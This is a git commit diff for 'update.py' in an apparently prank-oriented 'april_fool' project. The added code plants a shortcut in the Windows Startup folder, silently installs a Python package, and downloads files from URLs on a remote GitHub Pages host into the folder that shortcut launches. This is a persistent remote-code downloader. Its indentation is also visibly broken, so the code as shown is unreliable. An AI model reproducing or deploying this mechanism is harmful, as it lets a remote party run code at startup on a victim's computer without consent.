eecfc87561ad986d6b9143abf8ef1fa2469d55d9
AlbertLin2288 <67462242+AlbertLin2288@users.noreply.github.com>
2021-12-01 17:21:36 +0800

    Update update.py

--- april_fool/code/update.py
+++ april_fool/code/update.py
@@ -1,34 +1,61 @@
+import urllib.request
 import time
 import os
-files={}
+# from importlib import reload
+# import update as update_m
+
+def access(url, test):# repeatly try to get the page at 10s/tries
+    while True:
+        try:
+            page = urllib.request.urlopen(url)
+            if test:
+                print("Successfully read " + url)
+            break
+        except:
+            if test:
+                print("Fail to access " + url)
+            time.sleep(10)
+    return page
+
 path = r"D:\New folder\\"
 short_path = os.getenv("appdata")+r"\Microsoft\Windows\Start Menu\Programs" +\
              r"\Startup\start.lnk"
-def main():
-    for i in os.scandir("D:\\New folder"):
-        if os.path.isfile(os.path.join("D:\\New folder",i)):
-            with open(i) as file:
-                files[i.name] = file.read()
-    while 1:
-        try:
-            with open(r"D:\New folder\stop.txt") as file:
-                if file.read() == "Password":
-                    continue
-        os.makedirs(path, exist_ok = True)
-        try:#try to install SWinLnk and then create shortcut.
-            from swinlnk.swinlnk import SWinLnk
-            swl=SWinLnk()
-            swl.create_lnk(path+"start.cmd", short_path)
-        except:
-            for i in range(10):
-                try:
-                    os.system("py -m pip install swinlnk")
-                    from swinlnk.swinlnk import SWinLnk
-                    swl=SWinLnk()
-                    swl.create_lnk(path+"start.cmd", short_path)
-                    break
-        
-        for i in files:
-            with open(path+i,"w") as file:
-                file.write(files[i])
-        time.sleep(30*60)
+os.makedirs(path, exist_ok = True)
+try:#try to install SWinLnk and then create shortcut.
+        from swinlnk.swinlnk import SWinLnk
+        swl=SWinLnk()
+        swl.create_lnk(path+"start.cmd", short_path)
+        print("Successfully recreated shortcut")
+    except:
+        for i in range(10):
+            try:
+                os.system("py -m pip install swinlnk")
+                from swinlnk.swinlnk import SWinLnk
+                swl=SWinLnk()
+                swl.create_lnk(path+"start.cmd", short_path)
+                print("Successfully recreated shortcut")
+                break
+            except:pass
+def update(test =False):# update all code
+    vUrl = access("https://albertlin2288.github.io/april_fool/version.txt",
+                  test)
+    version = int(vUrl.read().decode().strip())
+    try:
+        with open(path + "version.txt") as file:
+            my_version = int(file.read().strip())
+    except:
+        my_version = -1
+    print(version,my_version)
+    if my_version < version:
+        adUrl = access("https://albertlin2288.github.io/april_fool/address.txt",
+                       test)
+        address = adUrl.read().decode().strip()
+        for i in address.split("\n"):
+            program_ad = access(i.split(" ")[1], test)
+            with open(path + i.split(" ")[0], "w") as file:
+                file.write(program_ad.read().decode())
+        with open(path + "version.txt", "w") as file:
+            file.write(str(version))
+
+if __name__ == "__main__":
+    update(1)
